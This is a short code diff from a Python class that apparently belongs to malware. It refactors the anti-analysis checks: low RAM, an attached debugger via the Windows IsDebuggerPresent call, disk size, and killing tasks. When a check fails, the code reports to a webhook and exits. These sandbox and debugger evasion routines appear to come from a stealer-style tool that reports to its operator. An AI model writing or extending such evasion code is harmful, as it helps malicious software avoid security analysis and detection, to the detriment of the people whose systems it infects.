@@ -46,7 +46,7 @@ class Miscellanoeus:
 			self.webhook.send(f"Ram Check: Less than 4 GB of RAM exists on this system", "Miscellaneous")
 			os._exit(1)
 
-	def IsDebuggerPresent(self):
+	def CheckIsDebuggerPresent(self):
 		isDebuggerPresent = ctypes.windll.kernel32.IsDebuggerPresent()
 
 		if (isDebuggerPresent):
@@ -75,7 +75,10 @@ class Miscellanoeus:
 			
 
 	def StartChecks(self):
-		self.CheckRam(), self.IsDebuggerPresent(), self.CheckDiskSize(), self.KillTasks()
+		self.CheckRam()
+		self.CheckIsDebuggerPresent()
+		self.CheckDiskSize()
+		self.KillTasks()
 		
 		self.CheckInternet()
 				
